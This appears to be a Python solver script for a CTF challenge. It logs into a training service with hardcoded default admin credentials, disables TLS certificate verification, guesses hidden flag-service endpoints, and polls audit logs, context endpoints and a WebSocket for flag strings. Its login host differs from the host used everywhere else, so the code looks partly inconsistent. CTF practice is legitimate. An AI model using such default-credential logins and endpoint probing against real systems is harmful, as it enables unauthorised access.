#!/usr/bin/env python3
"""
Monitor async responses for Shadow Coordinator CTF
The services returned context_ids and are queued - monitor for responses
"""
import requests
import websocket
import json
import threading
import time
import sys

class AsyncFlagMonitor:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = "https://training.my-ctf.com:8812"
        self.token = None
        self.ws = None
        self.flag_found = False
        self.context_ids = []

        # Login
        self._authenticate()

    def _authenticate(self):
        """Get authentication token"""
        login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
        resp = self.session.post(login_url, json={"username": "admin", "password": "admin1234"})
        self.token = resp.json()["access_token"]
        self.session.headers.update({
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        })
        print(f"[+] Authenticated")

    def start_websocket_monitor(self):
        """Monitor WebSocket for async responses"""
        def on_message(ws, message):
            timestamp = time.strftime('%H:%M:%S')
            print(f"[WS {timestamp}] {message}")

            # Check for flag patterns
            if any(keyword in message.lower() for keyword in ['flag{', 'ctf{', 'shadow', 'coordinator']):
                print(f"[!!!] POTENTIAL FLAG: {message}")

                # Try to extract flag format
                import re
                flag_match = re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', message, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(1)
                    print(f"\n[SUCCESS] FLAG FOUND: {flag}")
                    self.flag_found = True
                    return flag

        def on_open(ws):
            print("[+] WebSocket connected, monitoring for async responses...")

        def on_error(ws, error):
            print(f"[!] WebSocket error: {error}")

        try:
            ws_url = self.base_url.replace('https://', 'wss://') + "/api/websocket"
            self.ws = websocket.WebSocketApp(ws_url,
                                           header={"Authorization": f"Bearer {self.token}"},
                                           on_message=on_message,
                                           on_open=on_open,
                                           on_error=on_error)

            ws_thread = threading.Thread(target=self.ws.run_forever)
            ws_thread.daemon = True
            ws_thread.start()
            time.sleep(2)
            return ws_thread

        except Exception as e:
            print(f"[!] WebSocket error: {e}")
            return None

    def trigger_flag_services(self):
        """Trigger all flag-related services and collect context_ids"""
        print("\n[*] Triggering flag services...")

        flag_services = [
            "coordinator_flag",
            "get_coordinator_flag",
            "shadow_coordinator_flag",
            "coordinator_unlock_flag",
            "shadow_coordinator_unlock",
            "coordinator_reveal_flag",
            "get_shadow_coordinator_flag"
        ]

        for service in flag_services:
            try:
                resp = self.session.post(f"{self.base_url}/api/v2/services/system/{service}", json={})
                if resp.status_code == 200:
                    result = resp.json()
                    if 'context_id' in result:
                        context_id = result['context_id']
                        self.context_ids.append(context_id)
                        print(f"[+] Service {service} queued with context_id: {context_id}")
                    else:
                        print(f"[+] Service {service}: {result}")
            except Exception as e:
                print(f"[!] Error calling {service}: {e}")

        print(f"[*] Collected {len(self.context_ids)} context_ids")

    def poll_context_responses(self):
        """Poll for context responses"""
        print("\n[*] Polling context responses...")

        for i in range(30):  # Poll for 5 minutes
            print(f"[*] Poll iteration {i+1}/30")

            # Check audit log for recent activity
            try:
                resp = self.session.get(f"{self.base_url}/api/v2/system/audit-log")
                if resp.status_code == 200:
                    audit = resp.json()
                    recent = audit.get('entries', [])[:10]

                    for entry in recent:
                        entry_str = json.dumps(entry)
                        if any(keyword in entry_str.lower() for keyword in ['flag{', 'ctf{', 'coordinator', 'shadow']):
                            print(f"[!] AUDIT ENTRY: {entry_str}")

                            # Extract flag if found
                            import re
                            flag_match = re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', entry_str, re.IGNORECASE)
                            if flag_match:
                                flag = flag_match.group(1)
                                print(f"\n[SUCCESS] FLAG FOUND IN AUDIT: {flag}")
                                return flag
            except Exception as e:
                print(f"[!] Error checking audit: {e}")

            # Check for any context-specific endpoints
            for context_id in self.context_ids:
                try:
                    # Try different ways to get context results
                    endpoints = [
                        f"/api/v2/services/context/{context_id}",
                        f"/api/v2/services/status/{context_id}",
                        f"/api/v2/system/context/{context_id}",
                        f"/api/v2/context/{context_id}"
                    ]

                    for endpoint in endpoints:
                        resp = self.session.get(f"{self.base_url}{endpoint}")
                        if resp.status_code == 200:
                            result = resp.text.strip()
                            if result and result != "null":
                                print(f"[+] Context {context_id}: {result}")

                                if any(keyword in result.lower() for keyword in ['flag{', 'ctf{']):
                                    print(f"\n[SUCCESS] FLAG FOUND IN CONTEXT: {result}")
                                    return result
                except:
                    pass

            time.sleep(10)  # Wait 10 seconds between polls

    def monitor_states_changes(self):
        """Monitor for state changes that might contain flags"""
        print("\n[*] Monitoring state changes...")

        try:
            resp = self.session.get(f"{self.base_url}/api/v2/states")
            entities = resp.json().get('entities', [])

            for entity in entities:
                entity_str = json.dumps(entity)

                # Look for any new attributes or state changes
                if any(keyword in entity_str.lower() for keyword in ['flag{', 'ctf{', 'shadow', 'coordinator']):
                    print(f"[!] INTERESTING ENTITY: {json.dumps(entity, indent=2)}")

                    import re
                    flag_match = re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', entity_str, re.IGNORECASE)
                    if flag_match:
                        flag = flag_match.group(1)
                        print(f"\n[SUCCESS] FLAG FOUND IN STATE: {flag}")
                        return flag

        except Exception as e:
            print(f"[!] Error checking states: {e}")

    def run(self):
        """Main monitoring loop"""
        print("[*] Starting Shadow Coordinator async flag monitoring...")

        # Start WebSocket monitoring
        ws_thread = self.start_websocket_monitor()

        # Trigger services
        self.trigger_flag_services()

        # Wait a bit for services to process
        print("[*] Waiting for services to process...")
        time.sleep(5)

        # Monitor states for changes
        self.monitor_states_changes()

        # Poll for responses
        result = self.poll_context_responses()

        if result:
            return result

        # Keep WebSocket alive for longer monitoring
        if ws_thread:
            print("\n[*] Continuing WebSocket monitoring for 2 more minutes...")
            for i in range(12):
                if self.flag_found:
                    break
                print(f"[*] WebSocket monitoring... {120 - (i*10)} seconds remaining")
                time.sleep(10)

        return None

if __name__ == "__main__":
    monitor = AsyncFlagMonitor()
    flag = monitor.run()

    if flag:
        print(f"\n🎉 [FINAL SUCCESS] FLAG: {flag}")
    else:
        print("\n[*] No flag found in async monitoring")